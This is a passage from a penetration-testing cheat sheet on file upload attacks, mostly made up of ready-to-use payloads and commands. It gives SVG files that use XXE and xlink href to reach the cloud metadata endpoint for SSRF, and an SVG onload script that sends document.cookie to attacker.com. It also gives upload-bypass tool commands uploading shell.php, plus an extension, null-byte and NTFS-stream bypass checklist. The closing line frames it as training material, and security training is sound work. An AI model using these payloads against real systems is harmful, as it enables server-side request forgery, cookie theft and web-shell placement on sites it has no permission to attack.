# Check if target uses ImageMagick (upload PNG, check response for ImageMagick headers or profiles)
```

### SSRF via SVG Upload

```xml
<!-- Upload as profile.svg or any image upload accepting SVG -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>

<!-- SVG with SSRF via href: -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" x="0" y="0" height="100" width="100"/>
</svg>

<!-- SVG with JavaScript (XSS if SVG rendered in browser): -->
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/?c='+document.cookie)">
  <rect width="100" height="100"/>
</svg>
```

### File Upload Bypass Tools

```bash
# upload_bypass — automated bypass attempts:
# https://github.com/sAjibuu/Upload_Bypass
python3 upload_bypass.py -f shell.php -t https://target.com/upload -m 5
# -m 5 = method 5 (all methods)
# Tries: extension lists, content-type bypass, polyglots, null bytes

# Burp extension: Upload Scanner
# Automatically tests various bypass techniques during active scan

# fuxploider — file upload scanner:
python fuxploider.py --url https://target.com/upload --not-regex "wrong file type"

# Testing checklist commands:
# 1. Get baseline: upload .jpg, observe response
# 2. Change extension: .php, .php5, .phtml, .phar, .asp, .aspx, .jsp
# 3. Change Content-Type to image/jpeg
# 4. Try both simultaneously
# 5. Add double extension: .php.jpg
# 6. Try null byte: .php%00.jpg
# 7. Try case variation: .PHP, .PhP
# 8. Try NTFS ADS (Windows): .php::$DATA

# Check if uploaded file is web-accessible:
ffuf -u "https://target.com/uploads/FUZZ" -w uploaded_filenames.txt
# Look in page source for file path hints
# Check /uploads/, /files/, /media/, /static/, /assets/
```

---

*Document compiled for penetration testing training. All techniques documented from public security research and tool documentation (2023–2025).*
